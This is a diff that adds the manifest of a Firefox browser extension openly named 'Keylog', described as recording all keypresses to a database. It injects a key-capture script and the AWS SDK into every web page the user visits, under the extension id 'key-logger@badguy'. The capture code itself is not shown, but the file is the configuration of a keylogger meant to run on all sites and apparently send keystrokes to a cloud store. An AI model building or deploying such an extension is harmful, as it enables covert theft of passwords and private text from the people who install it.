@@ -1,0 +1,31 @@
+{
+  "manifest_version": 2,
+  "name": "Keylog",
+  "version": "1.0",
+
+  "description": "Records all keypresses to a database.",
+
+  "icons": {
+    "48": "icons/keyboard-48.png"
+  },
+
+  "permissions": ["storage"],
+
+  "background": {
+    "scripts": ["aws-sdk-2.230.1.js", "background.js"]
+  },
+
+  "content_scripts": [
+    {
+      "matches": ["<all_urls>"],
+      "js": ["aws-sdk-2.230.1.js", "key_capture.js"]
+    }
+  ],
+
+  "applications": {
+    "gecko": {
+      "id": "key-logger@badguy",
+      "strict_min_version": "54.0a1"
+    }
+  }
+}
